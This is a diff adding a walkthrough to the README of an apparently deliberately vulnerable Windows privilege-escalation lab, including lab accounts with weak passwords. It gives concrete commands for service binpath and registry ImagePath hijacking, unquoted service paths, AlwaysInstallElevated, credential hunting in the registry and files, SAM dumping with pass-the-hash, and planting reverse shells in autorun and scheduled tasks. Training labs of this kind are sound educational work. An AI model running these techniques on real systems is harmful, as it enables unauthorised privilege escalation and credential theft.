@@ -67,28 +67,172 @@ cd C:\Users\User\Desktop
 
 # How to use it this script
 
+I'm going to explain how to use it, but as a general way.
+I think the person who will use it will discover how to use some commands in order to privilege escalate this machine as its own pace.
+
+## Users
+user: t1rdus
+password: password123
+Groups: Remote Desktop and Remote Management (access via evil-winrm)
+
+I *STRONGLY RECOMMEND* use remote desktop access as your first access and them you can use a reverse shell (created via msfvenom) to your machine own.
+I had some problems using [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and other types of executables via evil-winrm.
+
+user: fakeadmin
+password: fakeadmin
+Vulnerability: SeImpersonatePrivilage
+Train using [GodPotato](https://github.com/BeichenDream/GodPotato)
+
+user: backupuser
+password: backup1
+Member of Backup Operators
+Grab SAM and SYSTEM FILES
+Use impacket-secretsdump to access the machine via [Pass the Hash](https://en.wikipedia.org/wiki/Pass_the_hash) technique.
+Then use impacket-psexec, evil-winrm or any kind of tool that you can use the PtH.
+
+
 # Services
 
-## File Permission
+## Insecure Service Permission 
 
-## Insecure Service Permission
+1) Check service daclsvc with accesschk (if it can be modify) and sc (its configuration)
+2) Check its status
+```cmd
+sc query daclsvc
+```
+3) Stop the service if it is necessary
 
-Need to use it after remote desktop login.
+4) Alter its binpath
+```cmd
+sc config daclsvc binpath="C:\Path\to\your\reverse.exe"
+```
+5) Setup a listener 
 
-## Unquoted Path
+6) Restart/Start this service
+
+## Unquoted Service Path
+
+1) Check if service unquotedsvc has this kind of vulnerability
+```
+sc qc unquotedsvc
+```
+2) Check if you have write permission to a directory using accesschk:
+```cmd
+.\accesschk.exe /accepteula -uwdq "C:\Begin of\Path To\Unquoted Service"
+```
+In this case, unquoted service is writable
+
+3) Stop the service if it is necessary
+
+4) Copy you reverse shell so I can be use something like this:
+```cmd
+copy C:\Path\to\your\reverse.exe "C:\Begin of\Path To\Unquoted.exe"
+```
+
+5) Setup a listener 
+
+6) Restart/Start the service
+
+## Weak Registry Permissions
+
+1) Check regsvc misconfiguration via accesschk:
+
+```cmd
+.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+```
+
+2) Overwrite the imagepath registry key in order to execute your reverse shell
+
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Path\to\your\reverse.exe /f
+```
+
+3) Restart/Start the service
+
+## Insecure Service Executables
+
+1) Check filepermservice
+2) Stop the service if it is necessary
+3) Copy your reverse shell
+4) Setup a listener 
+5) Restart/Start the service
 
 # Registry
 
+## Autorun
+
+1) Check Autorun executables:
+```cmd
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+2) Copy your reverse shell to autorun directory
+
+3) Setup a listener 
+ 
+4) Restart your machine
+
+## AlwaysInstallElevated
+
+1) Check manually:
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+2) Create a reverse shell with msi format using msfvenom
+
+3) Set up a listener
+
+4) Execute the following command:
+```
+msiexec /quiet /qn /i C:\Path\To\reverse.msi
+```
+
 # Passwords
 
-## Pass the Hash
+## Registry
 
-### SeBackupPrivilege
+1) Check for registry password
+```cmd
+reg query HKLM /f password /t REG_SZ /s
+```
+or
+```cmd
+reg query HKCU /f password /t REG_SZ /s
+```
+
+## Saved Creds
+
+1) Execute the command
+```cmd
+cmdkey /list
+```
+
+2) Can be found in savecred.bat file
+
+## Configuration File
+
+Unattend.xml saved in Pather directory. 
+Even after this script the Windows Machine removed the password in base64, but I saved this file in another directory. Go there and find it!
+
+1) Search recursivily for files with password in it:
+```cmd
+findstr /si password *.xml *.ini *.txt
+```
 
 # Scheduled Tasks
 
-# God Potato
+Check for schedules tasks:
+```cmd
+schtasks /query /fo LIST /v
+```
 
-## SeImpersonatePrivilege
+Or 
+```powershell
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
 
-# 
+There is a file Clean.ps1 which we can modify it (check all of this).
+Find it and use the following command to add our reverse shell to be executed.
+```
+echo C:\Path\For\Our\reverse.exe >> C:\Paths\to\Find\CleanUp.ps1
+```
+
